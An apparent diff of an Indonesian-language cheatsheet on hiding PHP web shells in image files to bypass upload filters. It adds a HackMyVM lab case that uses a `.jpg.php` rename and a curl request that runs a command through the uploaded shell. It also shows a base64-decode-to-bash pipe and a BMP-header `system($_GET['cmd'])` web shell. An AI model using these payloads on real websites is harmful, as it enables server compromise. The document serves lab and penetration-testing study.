@@ -25,6 +25,18 @@ Dengan format seperti ini, btw ini format favorit saya.
 ~$ echo (base64) | base64 -d | bash  
 ```
 
+## Kasus
+ada kasus menarik dari mesin [Beloved: HackMyVM], exploit yang saya jalankan dengan request `image` tidak berfungsi, jadi saya menggunakan trik manual yaitu mengganti format menjadi `.jpg.php` untuk membypass.
+
+![image](https://i.postimg.cc/63Vx9Pzf/image.png)
+
+Ketika saya eksekusi jadi seperti ini
+```
+╭─ via [machines/beloved]
+╰─ curl -s http://beloved/wp-content/uploads/2022/12/shell.jpg-1670590514.8364.php\?cmd\=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 Sebelum masuk ke cheatsheet, jika anda penikmat POST Request bisa mengganti `$_GET` menjadi `$_POST`. LOL semua orang juga sudah tau ini.
 
 ## JPG
@@ -47,6 +59,3 @@ echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
 ```
 
 Happy hacking!
-
-## References
-* https://twitter.com/0x0SojalSec/status/1599809897658724357
